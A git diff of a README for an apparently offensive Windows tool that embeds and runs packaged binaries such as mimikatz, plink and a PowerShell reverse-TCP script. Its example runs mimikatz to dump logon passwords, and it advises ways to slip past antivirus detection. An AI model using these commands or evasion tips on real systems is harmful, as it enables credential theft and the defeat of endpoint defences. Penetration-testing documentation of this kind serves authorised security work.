@@ -93,8 +93,15 @@ Sharing /tmp/private on 8080 ...
 
 ```
 C:\Users\Nodauf>.\webserver.exe run  
-Usage:
-.\webserver.exe run <binary> "<args>"
+You must specify a binary to run
+  -args string
+        Arguments for the binary
+  -binary string
+        Binary to execute
+  -help
+        Print usage
+  -list
+        List the embedded files
 
 Packaged Binaries:
 Invoke-PowerShellTcp.ps1
@@ -106,7 +113,7 @@ plink.exe
 #### Run binary with arguments:
 
 ```
-C:\Users\Nodauf>.\webserver.exe run mimikatz.exe "privilege::debug sekurlsa::logonpasswords"
+C:\Users\Nodauf>.\webserver.exe run -binary mimikatz.exe -args "privilege::debug sekurlsa::logonpasswords"
 ....
 ```
 Running binary this way could help bypassing AV protections. Sometimes the arguments sent to the binary may be catch by the AV, if possible use the interactive CLI of the binary (like mimikatz) or recompile the binary to change the arguments name.
